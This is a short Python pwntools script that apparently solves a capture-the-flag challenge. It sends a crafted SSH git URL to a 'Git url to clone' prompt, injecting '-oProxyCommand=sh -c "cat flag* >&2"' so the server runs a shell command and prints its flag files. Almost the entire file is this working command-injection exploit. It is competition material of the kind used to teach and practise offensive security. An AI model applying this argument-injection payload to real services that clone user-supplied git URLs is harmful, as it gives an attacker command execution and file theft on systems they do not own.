#!/usr/bin/env python3
from pwn import *

host = 'a62niopkpzugekyrd99i.h5.chal-kalmarc.tf'
port = 1337

# The ProxyCommand Bypass
payload = 'ssh://user@-oProxyCommand=sh -c "cat flag* >&2"/foo'

print(f"[*] Connecting to {host}:{port} via SSL...")
r = remote(host, port, ssl=True)

# Wait for the prompt
r.recvuntil(b'Git url to clone > ')

print(f"[*] Sending SSH ProxyCommand payload...")
r.sendline(payload.encode())

# Give the server a moment to execute and return the error stream
print("[*] Waiting for response (this may take a few seconds)...")
try:
    # We use a longer timeout for SSH-based payloads
    output = r.recvall(timeout=10).decode(errors='ignore')
    print("\n--- SERVER OUTPUT ---")
    print(output)
    print("----------------------")
except EOFError:
    print("[!] Connection closed.")

r.close()